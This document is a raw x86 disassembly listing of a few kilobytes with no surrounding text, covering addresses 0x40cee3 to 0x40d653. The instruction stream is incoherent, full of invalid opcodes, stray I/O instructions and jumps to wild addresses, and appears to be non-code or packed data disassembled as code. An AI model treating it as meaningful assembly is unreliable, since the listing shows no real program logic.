  40cee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cee4:	push   ecx
  40cee5:	sbb    eax,0x21579ad7
  40ceea:	sub    ah,BYTE PTR [edi+eiz*4-0x343b2ed3]
  40cef1:	jae    0x40cea9
  40cef3:	(bad)  [edi]
  40cef5:	lods   eax,DWORD PTR ds:[esi]
  40cef6:	repz pop ecx
  40cef8:	test   bh,dl
  40cefa:	es rcr esp,0x48
  40cefe:	push   es
  40ceff:	push   ds
  40cf00:	test   BYTE PTR [ecx],ah
  40cf02:	mov    BYTE PTR [edx],0x9f
  40cf05:	paddb  mm2,QWORD PTR [esi-0x72]
  40cf09:	cmp    al,0x7c
  40cf0b:	mov    ecx,0xb0c8a811
  40cf10:	ins    BYTE PTR es:[edi],dx
  40cf11:	inc    ebx
  40cf12:	mov    ecx,0x8f55ee09
  40cf17:	adc    esp,DWORD PTR [edx+eiz*8]
  40cf1a:	add    DWORD PTR [edi],ebx
  40cf1c:	(bad)  
  40cf1d:	sahf   
  40cf1e:	jns    0x40cf63
  40cf20:	stc    
  40cf21:	jae    0x40cf75
  40cf23:	pop    edx
  40cf24:	mul    BYTE PTR [eax]
  40cf26:	lods   al,BYTE PTR ds:[esi]
  40cf27:	or     al,0xd9
  40cf29:	push   esi
  40cf2a:	push   ebx
  40cf2b:	sub    BYTE PTR [esp+esi*4-0x3d],0x4f
  40cf30:	mov    bl,0x6
  40cf32:	call   0xf6ed:0x9c4acd3e
  40cf39:	sbb    eax,0x6b2b2587
  40cf3e:	sub    DWORD PTR [edi],ebx
  40cf40:	add    BYTE PTR [edi-0x67],bl
  40cf43:	into   
  40cf44:	cmp    BYTE PTR [ebx+eax*8],bl
  40cf47:	mov    ds:0xa0d9d784,eax
  40cf4c:	add    edi,DWORD PTR [edi+0x5d]
  40cf4f:	mov    bl,0x3d
  40cf51:	scas   al,BYTE PTR es:[edi]
  40cf52:	(bad)  
  40cf53:	fbstp  TBYTE PTR [edi+0x523ec16f]
  40cf59:	sub    edi,DWORD PTR [edx+0x5]
  40cf5c:	ins    BYTE PTR es:[edi],dx
  40cf5d:	pop    edx
  40cf5e:	(bad)  
  40cf5f:	mov    esi,0x97ce8132
  40cf64:	bound  ebp,QWORD PTR [ecx+ebp*1-0x96652d0]
  40cf6b:	dec    ebx
  40cf6c:	std    
  40cf6d:	xor    DWORD PTR [ecx],0x83d13dd9
  40cf73:	push   eax
  40cf74:	sbb    DWORD PTR [edi+0x31],ebx
  40cf77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf78:	add    DWORD PTR [ebx+0x39],ebx
  40cf7b:	(bad)  
  40cf7c:	test   BYTE PTR [ebx-0x22],0xc8
  40cf80:	pop    edi
  40cf81:	jl     0x40cffb
  40cf83:	sub    esp,esi
  40cf85:	inc    eax
  40cf86:	and    BYTE PTR [esi],cl
  40cf88:	mov    edx,0x53e2c348
  40cf8d:	sbb    eax,0x4904132e
  40cf92:	mov    al,0xa5
  40cf94:	mov    al,0x17
  40cf96:	sub    BYTE PTR [edx-0x74],dh
  40cf99:	rcl    ecx,1
  40cf9b:	ror    DWORD PTR [ecx+ebx*1-0x6fbd8eae],0x8a
  40cfa3:	stos   BYTE PTR es:[edi],al
  40cfa4:	psubsw mm7,mm2
  40cfa7:	jle    0x40d027
  40cfa9:	inc    edx
  40cfaa:	mov    edi,0xbf21eef7
  40cfaf:	push   edx
  40cfb0:	(bad)  
  40cfb1:	stc    
  40cfb2:	shl    BYTE PTR [ebp-0x50],1
  40cfb5:	test   al,0x89
  40cfb7:	mov    edx,0xff7260e3
  40cfbc:	jmp    FWORD PTR [ecx]
  40cfbe:	daa    
  40cfbf:	mov    al,ds:0xc06a45be
  40cfc4:	dec    ebp
  40cfc5:	ret    
  40cfc6:	cli    
  40cfc7:	push   ebp
  40cfc8:	or     al,BYTE PTR [ebx]
  40cfca:	outs   dx,DWORD PTR ds:[esi]
  40cfcb:	(bad)  
  40cfcc:	mov    edi,0x63ce322b
  40cfd1:	outs   dx,DWORD PTR ds:[esi]
  40cfd2:	mul    ebp
  40cfd4:	(bad)  
  40cfd6:	and    eax,0x6a5ca9b5
  40cfdb:	xor    al,0x72
  40cfdd:	xor    DWORD PTR ds:0xa27cb682,eax
  40cfe3:	int    0xb1
  40cfe5:	jnp    0x40cf85
  40cfe7:	cmc    
  40cfe8:	ins    BYTE PTR es:[edi],dx
  40cfe9:	mov    ebp,0x1ff9e2bb
  40cfee:	xchg   ebx,eax
  40cfef:	mov    ecx,0x93e1e159
  40cff4:	sub    dh,BYTE PTR [eax+0x78]
  40cff7:	xchg   esi,eax
  40cff8:	mov    edx,0xfcb55f5c
  40cffd:	dec    ebp
  40cffe:	mov    bl,BYTE PTR [edi-0x59c606b1]
  40d004:	aas    
  40d005:	lods   al,BYTE PTR ds:[esi]
  40d006:	stc    
  40d007:	popf   
  40d008:	add    DWORD PTR [esi+0x38],esp
  40d00b:	jb     0x40cfad
  40d00d:	dec    esp
  40d00e:	aam    0x49
  40d010:	jmp    0x40d07e
  40d012:	mov    bh,0xd5
  40d014:	test   BYTE PTR [ebx-0x55],ah
  40d017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d018:	jp     0x40cfeb
  40d01a:	sub    eax,0x6e9e0b95
  40d01f:	bound  edx,QWORD PTR [edi+0x7cd06af4]
  40d025:	push   0x42e20ce0
  40d02a:	outs   dx,BYTE PTR ds:[esi]
  40d02b:	push   esi
  40d02c:	scas   al,BYTE PTR es:[edi]
  40d02d:	dec    ecx
  40d02e:	ret    0xafea
  40d031:	pop    edi
  40d032:	mov    ebx,0xd5619ef5
  40d037:	fisttp DWORD PTR [ecx+eiz*2-0x72eb93ab]
  40d03e:	dec    ebx
  40d03f:	scas   al,BYTE PTR es:[edi]
  40d040:	mov    eax,ds:0xd868db16
  40d045:	pop    ecx
  40d046:	cli    
  40d047:	in     al,0x1e
  40d049:	cmp    bl,0xdc
  40d04c:	in     eax,0x45
  40d04e:	sar    BYTE PTR [edx+0x68fa7d93],cl
  40d054:	sbb    al,0x69
  40d056:	ins    BYTE PTR es:[edi],dx
  40d057:	mov    cl,0xb1
  40d059:	ja     0x40d052
  40d05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d05c:	cmp    al,0x46
  40d05e:	out    dx,al
  40d05f:	push   edx
  40d060:	ficom  WORD PTR [ebx]
  40d062:	imul   BYTE PTR [eax]
  40d064:	push   esi
  40d065:	push   edx
  40d066:	sar    BYTE PTR [eax-0x50],1
  40d069:	out    0xad,al
  40d06b:	in     eax,dx
  40d06c:	in     eax,0x33
  40d06e:	xor    BYTE PTR [ebx+ebx*2+0x5f5cf45c],ah
  40d075:	jno    0x40d040
  40d077:	sbb    DWORD PTR [edi+0x4dcd8545],eax
  40d07d:	daa    
  40d07e:	stc    
  40d07f:	lidtd  [edx-0x14e143c9]
  40d086:	mov    edx,0x9f9baebd
  40d08b:	out    0x58,al
  40d08d:	pop    ebp
  40d08e:	and    DWORD PTR gs:[esi+0x79997de6],ebx
  40d095:	mov    eax,ds:0x754e5557
  40d09a:	cmp    al,0xc
  40d09c:	enter  0x8e87,0x98
  40d0a0:	pop    eax
  40d0a1:	cmp    bl,BYTE PTR [ebp+edx*2+0x7b]
  40d0a5:	jle    0x40d0f8
  40d0a7:	push   ss
  40d0a8:	jmp    0xc0e094e
  40d0ad:	fidiv  DWORD PTR [edi-0xdb7e5c8]
  40d0b3:	push   esp
  40d0b4:	mov    ebx,0x51c68e12
  40d0b9:	and    eax,0xb2358079
  40d0be:	adc    DWORD PTR [ecx+ecx*4+0x1720a324],ecx
  40d0c5:	mov    ah,0x9d
  40d0c7:	lock call 0x2712:0x419e6463
  40d0cf:	popf   
  40d0d0:	and    eax,0x508917b4
  40d0d5:	sbb    eax,0x991004bc
  40d0da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0db:	in     eax,0xbd
  40d0dd:	mov    ebx,0xa34b2a6c
  40d0e2:	ja     0x40d072
  40d0e4:	add    dh,ch
  40d0e6:	ja     0x40d0fe
  40d0e8:	iret   
  40d0e9:	add    DWORD PTR [esi-0x80],esp
  40d0ec:	not    BYTE PTR ds:0x53ccc296
  40d0f2:	inc    edx
  40d0f3:	and    al,BYTE PTR [ebp-0x14]
  40d0f6:	mov    edx,DWORD PTR [edx+0x2ff04824]
  40d0fc:	(bad)  
  40d0fe:	xchg   DWORD PTR [ecx],edx
  40d100:	dec    esi
  40d101:	dec    ecx
  40d102:	scas   eax,DWORD PTR es:[edi]
  40d103:	xchg   ecx,eax
  40d104:	je     0x40d08b
  40d106:	pop    edi
  40d107:	mov    dh,0x12
  40d109:	xor    eax,0xbc517033
  40d10e:	push   edx
  40d10f:	lods   al,BYTE PTR ds:[esi]
  40d110:	fild   WORD PTR ds:0x97119ac
  40d116:	mov    al,ds:0xcb749b62
  40d11b:	rcl    DWORD PTR [eax+0x2a],0x55
  40d11f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d120:	add    DWORD PTR ds:0x61972234,ebx
  40d126:	push   esi
  40d127:	mov    esp,0x31f49100
  40d12c:	pop    eax
  40d12d:	aaa    
  40d12e:	mov    esp,0xcdab5cd
  40d133:	out    0x15,al
  40d135:	and    edx,DWORD PTR [esi-0x12d8236e]
  40d13b:	js     0x40d0f6
  40d13d:	cmp    eax,0xcc29aadb
  40d142:	or     eax,0xde494c1c
  40d147:	inc    ebp
  40d148:	mov    ebx,0x5239c625
  40d14d:	js     0x40d181
  40d14f:	out    dx,al
  40d150:	pop    ebp
  40d151:	xchg   esi,eax
  40d152:	sar    BYTE PTR [edx+esi*8],1
  40d155:	outs   dx,BYTE PTR ds:[esi]
  40d156:	outs   dx,BYTE PTR ds:[esi]
  40d157:	imul   ebp,DWORD PTR [ebp+0x7603a858],0x29
  40d15e:	shr    BYTE PTR [esi-0x5f],1
  40d161:	push   0xffffffec
  40d163:	xor    DWORD PTR [edx+esi*1],edi
  40d166:	pop    eax
  40d167:	popa   
  40d168:	fnsave [ebx+esi*1-0x689e4b3b]
  40d16f:	(bad)  
  40d170:	and    eax,0x428f63c1
  40d175:	into   
  40d176:	push   0x1afeca75
  40d17b:	cmp    esp,esp
  40d17d:	icebp  
  40d17e:	bound  ebx,QWORD PTR [ebx+0x5ce3ce69]
  40d184:	ret    0x9266
  40d187:	repz xor bh,BYTE PTR [ecx]
  40d18a:	sti    
  40d18b:	in     al,0xfb
  40d18d:	ins    DWORD PTR es:[edi],dx
  40d18e:	or     ebx,DWORD PTR [edx-0x77b37b7d]
  40d194:	popa   
  40d195:	outs   dx,BYTE PTR ds:[esi]
  40d196:	inc    esi
  40d197:	out    0xbd,eax
  40d199:	test   eax,0x3a5e1c3c
  40d19e:	sbb    BYTE PTR [ebp+0x305283c2],ch
  40d1a4:	ins    BYTE PTR es:[edi],dx
  40d1a5:	ss inc esi
  40d1a7:	lods   al,BYTE PTR ds:[esi]
  40d1a8:	push   ds
  40d1a9:	mov    al,ds:0x9e145bd1
  40d1ae:	cmp    al,0xc
  40d1b0:	pop    ecx
  40d1b1:	jne    0x40d1d7
  40d1b3:	(bad)  
  40d1b4:	adc    DWORD PTR [edx+ebp*1-0xe346189],ecx
  40d1bb:	push   eax
  40d1bc:	add    ah,BYTE PTR [eax+0x45af1dd0]
  40d1c2:	or     esp,DWORD PTR [edi+0x21]
  40d1c5:	mov    ?,esi
  40d1c7:	xor    ch,BYTE PTR [eax]
  40d1c9:	loop   0x40d21f
  40d1cb:	shl    DWORD PTR [esi-0x6b],cl
  40d1ce:	mov    al,0xca
  40d1d0:	cmp    DWORD PTR [ecx+0x5003216e],esi
  40d1d6:	push   edi
  40d1d7:	arpl   WORD PTR [eax+eax*8-0x1e],dx
  40d1db:	push   ds
  40d1dc:	mov    cl,0x8c
  40d1de:	inc    esi
  40d1e0:	lock ret 
  40d1e2:	mov    bh,0xcd
  40d1e4:	sti    
  40d1e5:	mov    bl,0x8e
  40d1e7:	call   0x8698:0xdc0f4abe
  40d1ee:	outs   dx,DWORD PTR ds:[esi]
  40d1ef:	mov    esp,0xbe9c0145
  40d1f4:	pop    ecx
  40d1f5:	test   eax,0x8b49eaed
  40d1fa:	or     BYTE PTR [esi],dl
  40d1fc:	sub    al,0xfa
  40d1fe:	pop    edi
  40d1ff:	adc    BYTE PTR [ecx-0x7149f0d7],bh
  40d205:	push   ebp
  40d206:	mov    al,ds:0x1d7b11df
  40d20b:	mov    esi,0x36ffaac9
  40d210:	out    dx,al
  40d211:	add    DWORD PTR [ecx],eax
  40d213:	retf   0xff42
  40d216:	loop   0x40d1dd
  40d218:	push   ecx
  40d219:	out    dx,al
  40d21a:	mov    al,0x33
  40d21c:	adc    eax,DWORD PTR [esi+0x2]
  40d21f:	dec    eax
  40d220:	mov    eax,edx
  40d222:	ror    ebp,cl
  40d224:	push   ecx
  40d225:	xor    DWORD PTR [ebx],0x75
  40d228:	inc    edx
  40d229:	adc    edx,DWORD PTR [esi+0x6]
  40d22c:	inc    eax
  40d22d:	ja     0x40d1e1
  40d22f:	retf   0x3062
  40d232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d233:	jmp    0x610e7588
  40d238:	jecxz  0x40d1bf
  40d23a:	cmp    al,0xc7
  40d23c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d23d:	(bad)  
  40d23e:	repz fs mov bh,0xdb
  40d242:	jmp    0xe932b9a9
  40d247:	jb     0x40d254
  40d249:	pop    ds
  40d24a:	and    ecx,DWORD PTR [ecx+0x5a8deca0]
  40d250:	cdq    
  40d251:	push   0xc378a9f8
  40d256:	sar    BYTE PTR [ebp-0x3a],0x46
  40d25a:	mov    ah,0xfa
  40d25c:	mov    dl,0x31
  40d25e:	mov    bh,0x25
  40d260:	jae    0x40d23c
  40d262:	pop    ecx
  40d263:	adc    bh,BYTE PTR [ebx]
  40d265:	cmp    eax,0x41fa352f
  40d26a:	xlat   BYTE PTR ds:[ebx]
  40d26b:	clc    
  40d26c:	add    ebx,eax
  40d26e:	inc    esp
  40d26f:	scas   eax,DWORD PTR es:[edi]
  40d270:	sbb    al,0x82
  40d272:	movd   DWORD PTR [ecx-0x6f],mm6
  40d276:	stos   DWORD PTR es:[edi],eax
  40d277:	mov    ah,0x32
  40d279:	adc    DWORD PTR [ecx+edi*4-0x69923f61],ecx
  40d280:	sbb    bh,dh
  40d282:	dec    ebx
  40d283:	outs   dx,DWORD PTR ds:[esi]
  40d284:	aaa    
  40d285:	or     ah,al
  40d287:	loop   0x40d244
  40d289:	cli    
  40d28a:	mov    es,WORD PTR [ebx-0x7f1c315a]
  40d290:	pushf  
  40d291:	push   cs
  40d292:	ror    DWORD PTR [ebx],cl
  40d294:	outs   dx,BYTE PTR ds:[esi]
  40d295:	jp     0x40d2d1
  40d297:	mov    esp,0x67adaeb7
  40d29c:	fcom   st(7)
  40d29e:	shr    DWORD PTR [ebx-0x51],cl
  40d2a1:	gs push edi
  40d2a3:	lock pop ss
  40d2a5:	push   eax
  40d2a6:	push   es
  40d2a7:	sub    esp,DWORD PTR [ecx-0x4423af3]
  40d2ad:	mov    eax,0x15c7319c
  40d2b2:	push   es
  40d2b3:	lods   eax,DWORD PTR ds:[esi]
  40d2b4:	daa    
  40d2b5:	push   0xa075465b
  40d2ba:	fild   DWORD PTR [edx]
  40d2bc:	mov    WORD PTR [ebp-0x75],es
  40d2bf:	add    bl,BYTE PTR [edx-0x6]
  40d2c2:	adc    al,0x9d
  40d2c4:	cmp    BYTE PTR [ecx+ecx*4+0x61],dl
  40d2c8:	(bad)  
  40d2ca:	lahf   
  40d2cb:	fdivrp st(7),st
  40d2cd:	jp     0x40d339
  40d2cf:	hlt    
  40d2d0:	inc    ecx
  40d2d1:	and    DWORD PTR [ebp+0x64],edx
  40d2d4:	inc    ecx
  40d2d5:	jl     0x40d286
  40d2d7:	aaa    
  40d2d8:	jge    0x40d2dd
  40d2da:	call   0x3fd5221e
  40d2df:	popa   
  40d2e0:	and    DWORD PTR [eax-0x7bd68d76],ebx
  40d2e6:	cmp    al,0x19
  40d2e8:	jo     0x40d35a
  40d2ea:	out    0x3e,eax
  40d2ec:	sbb    BYTE PTR [edx-0x1c],ah
  40d2ef:	sub    al,0x85
  40d2f1:	pop    esi
  40d2f2:	mov    edx,DWORD PTR [ebx+0x44f471be]
  40d2f8:	sbb    eax,0xf50e376a
  40d2fd:	or     BYTE PTR [ebx],dl
  40d2ff:	fwait
  40d300:	or     esp,DWORD PTR [edx-0x6f04f9be]
  40d306:	cmp    esp,ebp
  40d308:	xlat   BYTE PTR fs:[ebx]
  40d30a:	cld    
  40d30b:	int3   
  40d30c:	int3   
  40d30d:	cs add eax,0x75e18097
  40d313:	fistp  WORD PTR [esi]
  40d315:	inc    eax
  40d316:	cli    
  40d317:	out    0x0,al
  40d319:	je     0x40d2f6
  40d31b:	pusha  
  40d31c:	pop    eax
  40d31d:	jae    0x40d2fd
  40d31f:	mov    BYTE PTR [edx-0x10eadf63],bl
  40d325:	pop    ds
  40d326:	stc    
  40d327:	cmp    ch,al
  40d329:	popa   
  40d32a:	push   0x76
  40d32c:	stos   DWORD PTR es:[edi],eax
  40d32d:	inc    ebp
  40d32e:	daa    
  40d32f:	cmp    BYTE PTR [esi+0x45fe3d69],al
  40d335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d336:	xor    eax,0x368127ab
  40d33b:	or     ebx,DWORD PTR cs:[edi]
  40d33e:	pop    ss
  40d33f:	aam    0x67
  40d341:	pushf  
  40d342:	loopne 0x40d304
  40d344:	fst    QWORD PTR [edi+0x31]
  40d347:	and    al,0xa1
  40d349:	or     edx,ebp
  40d34b:	data16 cmp al,0x2
  40d34e:	jmp    0x40d34e
  40d350:	mov    DWORD PTR [ecx+ebp*4],esi
  40d353:	jmp    0x253cfd80
  40d358:	int3   
  40d359:	push   es
  40d35a:	jge    0x40d33e
  40d35c:	dec    esi
  40d35d:	(bad)  
  40d35e:	jbe    0x40d2e5
  40d360:	jno    0x40d3d8
  40d362:	ss push ds
  40d364:	outs   dx,DWORD PTR ds:[esi]
  40d365:	push   eax
  40d366:	mov    BYTE PTR [ecx],al
  40d368:	add    bh,BYTE PTR [ebx-0x1f19a1ef]
  40d36e:	sbb    eax,0x93bc46ab
  40d373:	pop    ds
  40d374:	fidivr WORD PTR [esp+edi*8+0x13]
  40d378:	cdq    
  40d379:	push   edi
  40d37a:	push   0x8bf6e730
  40d37f:	jmp    FWORD PTR [ebx-0x42]
  40d382:	cmp    al,0x80
  40d384:	cmp    ah,BYTE PTR [edi+0x6]
  40d387:	jne    0x40d33c
  40d389:	rcr    DWORD PTR [ebx],cl
  40d38b:	add    esp,DWORD PTR [ebp+0x14]
  40d38e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d38f:	jmp    0x3dc7:0x69438ac0
  40d396:	mov    esp,0x2e09a120
  40d39b:	push   edi
  40d39c:	jnp    0x40d33c
  40d39e:	sub    edx,0xffffffaf
  40d3a1:	push   ecx
  40d3a2:	mov    BYTE PTR ds:0x679a1cca,bl
  40d3a8:	or     BYTE PTR [eax-0x39],ah
  40d3ab:	imul   ebp,DWORD PTR [eax-0x53],0x1d2be97f
  40d3b2:	dec    esp
  40d3b3:	mov    dl,0x30
  40d3b5:	test   eax,edx
  40d3b7:	clc    
  40d3b8:	icebp  
  40d3b9:	repz cdq 
  40d3bb:	xchg   esi,eax
  40d3bc:	mov    ah,0xec
  40d3be:	pop    es
  40d3bf:	cmp    BYTE PTR [ebx+0x3db1c8a4],ch
  40d3c5:	lods   eax,DWORD PTR ds:[esi]
  40d3c6:	mov    DWORD PTR [ebx+0x7e6b50ac],esp
  40d3cc:	jns    0x40d3dd
  40d3ce:	or     eax,0x3242e610
  40d3d3:	icebp  
  40d3d4:	xlat   BYTE PTR ds:[ebx]
  40d3d5:	ins    DWORD PTR es:[edi],dx
  40d3d6:	rol    BYTE PTR [ebx-0x1c],cl
  40d3d9:	push   edx
  40d3da:	loopne 0x40d3c0
  40d3dc:	iret   
  40d3dd:	adc    al,0x8e
  40d3df:	mov    eax,cs
  40d3e1:	fld    st(0)
  40d3e3:	xchg   esp,eax
  40d3e4:	das    
  40d3e5:	pop    ecx
  40d3e6:	lods   al,BYTE PTR ds:[esi]
  40d3e7:	push   esi
  40d3e8:	inc    edx
  40d3e9:	lods   eax,DWORD PTR ds:[esi]
  40d3ea:	arpl   WORD PTR [ebp+0x26],di
  40d3ed:	hlt    
  40d3ee:	push   edx
  40d3ef:	xchg   ecx,eax
  40d3f0:	xor    DWORD PTR [ecx+ecx*2-0x70cd2c1b],edx
  40d3f7:	sbb    BYTE PTR [edx],0xf4
  40d3fa:	push   ebx
  40d3fb:	mov    cl,0x77
  40d3fd:	mov    cl,ah
  40d3ff:	inc    ebp
  40d400:	xchg   esi,eax
  40d401:	(bad)  
  40d402:	dec    edi
  40d403:	(bad)
  40d406:	inc    ebx
  40d407:	je     0x40d3c5
  40d409:	xor    DWORD PTR [esi+0x687e5b8b],ebx
  40d40f:	outs   dx,BYTE PTR ds:[esi]
  40d410:	loope  0x40d3e3
  40d412:	inc    edi
  40d413:	add    eax,0xa80d2b57
  40d418:	push   cs
  40d419:	and    eax,0xad6a037e
  40d41e:	iret   
  40d41f:	ins    BYTE PTR es:[edi],dx
  40d420:	mov    ds:0xacfe6e92,al
  40d425:	int    0x51
  40d427:	pop    ecx
  40d428:	pop    ecx
  40d429:	leave  
  40d42a:	push   esi
  40d42b:	das    
  40d42c:	retf   
  40d42d:	mov    WORD PTR [eax],?
  40d42f:	adc    eax,0x219ac3cc
  40d434:	aaa    
  40d435:	jmp    0xcfe3ab5b
  40d43a:	pushf  
  40d43b:	dec    edx
  40d43c:	test   BYTE PTR [ebx-0x55eb276b],bl
  40d442:	repz sub al,0x4c
  40d445:	push   eax
  40d446:	pop    edx
  40d447:	mov    eax,ds:0xc65223a5
  40d44c:	sahf   
  40d44d:	ret    0x816
  40d450:	jecxz  0x40d483
  40d452:	rcl    cl,0x96
  40d455:	fwait
  40d456:	dec    edi
  40d457:	mov    ebx,ss
  40d459:	lods   eax,DWORD PTR ds:[esi]
  40d45a:	mov    edx,DWORD PTR [ebx]
  40d45c:	jno    0x40d424
  40d45e:	mov    ebp,0x93b2b17f
  40d463:	dec    ebx
  40d464:	das    
  40d465:	add    BYTE PTR [ebx+0x8b351a0],0x65
  40d46c:	pushf  
  40d46d:	adc    edx,ecx
  40d46f:	data16 and al,BYTE PTR [edx+0x6307246]
  40d476:	push   esp
  40d477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d478:	jl     0x40d457
  40d47a:	sbb    edx,eax
  40d47c:	pop    eax
  40d47d:	and    al,0xc7
  40d47f:	sbb    al,0xa5
  40d481:	xor    DWORD PTR [ebx],0xf5e3e1de
  40d487:	sub    al,0x1c
  40d489:	loopne 0x40d504
  40d48b:	pop    edi
  40d48c:	push   ebp
  40d48d:	push   ebx
  40d48e:	loop   0x40d455
  40d490:	xor    cl,BYTE PTR ds:0xfc123dba
  40d496:	outs   dx,DWORD PTR ds:[esi]
  40d497:	js     0x40d4f1
  40d499:	mov    edi,0x72a4146a
  40d49e:	stc    
  40d49f:	test   eax,0x1a9e008f
  40d4a4:	or     al,0xa0
  40d4a6:	jecxz  0x40d458
  40d4a8:	scas   eax,DWORD PTR es:[edi]
  40d4a9:	sub    BYTE PTR [esi],al
  40d4ab:	test   DWORD PTR [edi+eiz*1],0xa65dba14
  40d4b2:	repz inc ebx
  40d4b4:	pop    esi
  40d4b5:	scas   eax,DWORD PTR es:[edi]
  40d4b6:	mov    bl,0xbc
  40d4b8:	add    DWORD PTR [esi],0xfd363512
  40d4be:	sub    al,0x32
  40d4c0:	call   0xc4987f3d
  40d4c5:	std    
  40d4c6:	add    ebp,DWORD PTR [edi]
  40d4c8:	xchg   ebp,eax
  40d4c9:	mov    esp,0xfa73b941
  40d4ce:	adc    eax,ecx
  40d4d0:	mov    al,ds:0xe4403d96
  40d4d5:	out    dx,eax
  40d4d6:	sbb    BYTE PTR [ecx+0x4b6d959a],ch
  40d4dc:	iret   
  40d4dd:	mov    eax,cs:0x8da8cf8c
  40d4e3:	mov    ecx,0x277109d2
  40d4e8:	lds    esi,FWORD PTR [eax+ebp*1+0x5f]
  40d4ec:	xor    ah,al
  40d4ee:	jb     0x40d541
  40d4f0:	add    al,0x43
  40d4f2:	jns    0x40d53b
  40d4f4:	mov    al,0xfb
  40d4f6:	lock xor cl,BYTE PTR ds:[eax-0x7b0f73f8]
  40d4fe:	repnz xchg edi,eax
  40d500:	sub    bl,dh
  40d502:	adc    DWORD PTR [esi+edi*1+0x7c327ab1],esi
  40d509:	dec    eax
  40d50a:	jl     0x40d529
  40d50c:	cs push 0x47531d1
  40d512:	sbb    BYTE PTR [ecx+0x20],ch
  40d515:	mov    ds:0x44e74544,al
  40d51a:	or     eax,0x4c659529
  40d51f:	call   0x6e5:0x7e99eaca
  40d526:	popf   
  40d527:	ins    BYTE PTR es:[edi],dx
  40d528:	repnz (bad) 
  40d52a:	and    eax,0x8402389c
  40d52f:	vpmulhuw ymm7,ymm6,YMMWORD PTR [ebp+0x3b]
  40d534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d535:	aas    
  40d536:	not    BYTE PTR [esi]
  40d538:	mov    ebp,0x774ff519
  40d53d:	sub    BYTE PTR [esi-0x66],bl
  40d540:	out    dx,al
  40d541:	cmp    bl,BYTE PTR [ecx]
  40d543:	dec    ebp
  40d544:	push   ecx
  40d545:	add    DWORD PTR [eax],esp
  40d547:	adc    al,0xf5
  40d549:	loopne 0x40d530
  40d54b:	sbb    eax,0x7136f7f8
  40d550:	xor    BYTE PTR [ebp+ecx*8+0x48],cl
  40d554:	in     al,dx
  40d555:	dec    esp
  40d556:	aad    0x9d
  40d558:	into   
  40d559:	push   ss
  40d55a:	push   edi
  40d55b:	dec    edx
  40d55c:	sbb    al,0x69
  40d55e:	pop    edx
  40d55f:	mov    edx,0xc56ecb3b
  40d564:	or     al,BYTE PTR [ebx]
  40d566:	mov    esp,0x276e5701
  40d56b:	mov    edx,0x8d204b36
  40d570:	and    DWORD PTR [edi+0x431d8dfc],eax
  40d576:	sub    bh,BYTE PTR [ecx-0x48]
  40d579:	jnp    0x40d5d4
  40d57b:	dec    eax
  40d57c:	add    DWORD PTR [esi-0x24],ebp
  40d57f:	jp     0x40d5be
  40d581:	inc    ecx
  40d582:	add    DWORD PTR [ecx-0x21],ebp
  40d585:	mov    al,0x83
  40d587:	ja     0x40d57f
  40d589:	sbb    BYTE PTR [ebp-0xa],bh
  40d58c:	add    DWORD PTR [eax+0x1797eb7],esi
  40d592:	aam    0x4d
  40d594:	cld    
  40d595:	or     esi,esi
  40d597:	adc    al,0x6f
  40d599:	jge    0x40d5e7
  40d59b:	sar    DWORD PTR [esi+eax*4-0x6982407f],1
  40d5a2:	sub    DWORD PTR [ebx-0x29],edi
  40d5a5:	xor    al,0x32
  40d5a7:	(bad)  
  40d5aa:	neg    edx
  40d5ac:	cmp    BYTE PTR [esi+0x12],bl
  40d5af:	cmp    al,0x48
  40d5b1:	fimul  DWORD PTR [edx+eax*4-0x55]
  40d5b5:	jne    0x40d57d
  40d5b7:	repnz into 
  40d5b9:	clc    
  40d5ba:	sbb    dh,BYTE PTR [edx+0x14]
  40d5bd:	push   esp
  40d5be:	and    BYTE PTR [edx+0x3b],0xf8
  40d5c2:	pop    esi
  40d5c3:	sti    
  40d5c4:	xchg   edi,eax
  40d5c5:	sbb    al,0x36
  40d5c7:	(bad)  
  40d5c8:	repnz pop ebx
  40d5ca:	test   DWORD PTR [eax],esp
  40d5cc:	or     ebx,DWORD PTR [edi+0x669574a9]
  40d5d2:	dec    edx
  40d5d3:	cdq    
  40d5d4:	lods   eax,DWORD PTR ds:[esi]
  40d5d5:	sub    al,0xb1
  40d5d7:	loope  0x40d559
  40d5d9:	repnz pop ebp
  40d5db:	cmp    DWORD PTR [esi+0x1ed9ec19],0x3de75bc8
  40d5e5:	idiv   DWORD PTR [ebx+0x7e]
  40d5e8:	dec    ebp
  40d5e9:	sbb    edx,ebx
  40d5eb:	mov    ebx,0x33974d0
  40d5f0:	js     0x40d64e
  40d5f2:	xchg   ecx,eax
  40d5f3:	iret   
  40d5f4:	ret    
  40d5f5:	imul   esp,DWORD PTR [eax-0x27],0x6f
  40d5f9:	retf   0xa629
  40d5fc:	mov    ah,0x66
  40d5fe:	sub    eax,0xbecf39db
  40d603:	push   ss
  40d604:	mov    ecx,0xe254a4c2
  40d609:	cmp    eax,0xa918ae6f
  40d60e:	mov    eax,0x695b8261
  40d613:	inc    eax
  40d614:	mov    edi,0x2c38814b
  40d619:	pop    eax
  40d61a:	mov    cl,0xec
  40d61c:	jae    0x40d68e
  40d61e:	and    al,0xd0
  40d620:	call   0x921332a2
  40d625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d626:	(bad)  [edx+0x28f40ca0]
  40d62c:	mov    ebp,0x66d816fa
  40d631:	lock jl 0x40d681
  40d634:	cs xor eax,0xe94ee834
  40d63a:	les    ecx,FWORD PTR [edx+0x36]
  40d63d:	add    DWORD PTR [ecx-0x60],esi
  40d640:	dec    eax
  40d641:	cld    
  40d642:	inc    ebx
  40d643:	sub    edx,DWORD PTR [ebx]
  40d645:	out    0xf8,eax
  40d647:	cmp    dl,BYTE PTR [eax+0x2d]
  40d64a:	mov    bl,0xb8
  40d64c:	adc    al,al
  40d64e:	push   ecx
  40d64f:	mov    dl,0x51
  40d651:	pop    edx
  40d652:	cli    
  40d653:	nop
